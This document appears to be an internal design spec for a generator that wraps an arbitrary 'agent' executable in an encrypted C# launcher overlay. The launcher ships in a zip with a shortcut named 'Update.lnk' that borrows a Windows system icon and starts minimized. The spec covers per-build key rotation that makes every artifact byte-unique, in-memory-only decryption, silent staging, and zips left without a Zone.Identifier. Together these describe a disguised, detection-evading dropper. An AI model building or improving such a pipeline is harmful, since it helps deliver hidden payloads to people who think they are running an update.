# Launcher-mode integration spec (LOCKED)

Contract between the generator server (`generator/src/launcher-build.ts`), the
C# launcher (`generator/launcher/template.cs`), the dev stamp tool
(`launcher/dev/make-stamp.mjs`) and the web app (`vanta/lib/zip-generator.ts`).
Both sides must stay byte-in-sync — do NOT change one side alone.

## 1. Payload import (one-time)

- `POST /payload`, `Authorization: Bearer <GENERATOR_SECRET>`,
  `Content-Type: application/octet-stream`, raw agent exe body (≤ 500 MB).
- Server pre-encrypts under the cache master key and stores ONLY ciphertext
  (`generator/payload-cache/payload.bin` 0600 `master.key`, `meta.json`).
- Optional `PAYLOAD_PATH` startup import. Plaintext exists only in memory.

## 2. Overlay (appended after the PE — both sides in sync)

```
offset  size  field
0       4     magic "VNTR"
4       1     version = 1
5       1     flags: bit0 = TEST_MODE
6       2     reserved
8       4     envLen  uint32 = 65
12      4     cfgLen  uint32
16      4     payLen  uint32
20      4     reserved
24      65    envelope ciphertext:
              AES-256-CTR(SealData.KEY, SealData.IV) over
              K_B(32) ‖ IV_PAY(16) ‖ IV_CFG(16) ‖ CK(1)
              CK = xor of byte 0..63 of the plaintext
after    cfgLen  config ciphertext   AES-256-CTR(K_B, IV_CFG)
after    payLen  payload ciphertext  AES-256-CTR(K_B, IV_PAY)
| 12-byte fixed trailer at EOF: cfgLen u32 | payLen u32 | "VNTZ"
```

- The launcher locates the overlay via the EOF trailer, validates magic/
  version/lengths, decrypts the envelope with its *compile-time* seal, then
  decrypts config + payload strictly in memory (chunked CTR, pure C#).
- `SealData.cs` is baked into each compiled launcher (unique KEY/IV/TAG) and is
  kept by the pool ONLY for the stamp step.
- Per-build fresh `K_B` (32 B), `IV_PAY`/`IV_CFG` (16 B each) ⇒ ciphertext and
  thus every stamped exe / zip is byte-unique even for identical payloads.

## 3. Config wire format (URL-query style, values percent-encoded)

```
apiUrl=<enc>&clientId=<enc>&siteId=<enc>&agentType=<enc>&authToken=<enc>
&features=<enc csv>&enroll=<enc>&outDir=<enc>&debug=0|1
```

`encodeURIComponent` on the server side; the launcher percent-decodes
(`%XX` + `+`→space). `authToken` lives ONLY inside this encrypted block.
Production builds use `debug=0` (silent staging).

## 4. The zip

- **Update.lnk**: relative `TargetPath = Launcher.exe`,
  `RELATIVE_PATH = .\Launcher.exe`, no `COMMAND_LINE_ARGUMENTS`, no
  `WORKING_DIR` (empty → Explorer starts the target in the shortcut's own
  folder), `IconLocation = C:\Windows\System32\imageres.dll,48`,
  `ShowCommand = 7`. The `NAME_STRING` description embeds the launcher TAG
  (8 hex chars) so the .lnk itself is byte-unique per build.
- **Launcher.exe**: pooled GUI-subsystem PE + overlay.
- Exactly 2 entries, no Zone.Identifier, `unzip -t` clean.

## 5. Keys / threat model

| Key | Where | Purpose |
|---|---|---|
| `SealData.KEY/IV` | compiled into one specific launcher | seals the 65-B envelope (K_L/IV_L) |
| `PAYLOAD_MASTER_KEY` | server cache (`master.key` 0600) | at-rest cipher for imported payload |
| `K_B/IV_PAY/IV_CFG` | per-build random, then discarded | re-key payload + config in one artifact |

This is **obfuscation with per-artifact uniqueness**, not a security boundary:
a debugger or the documented keys recover everything. No PS/shellcode/RWX in
the path; AMSI default stays `none`.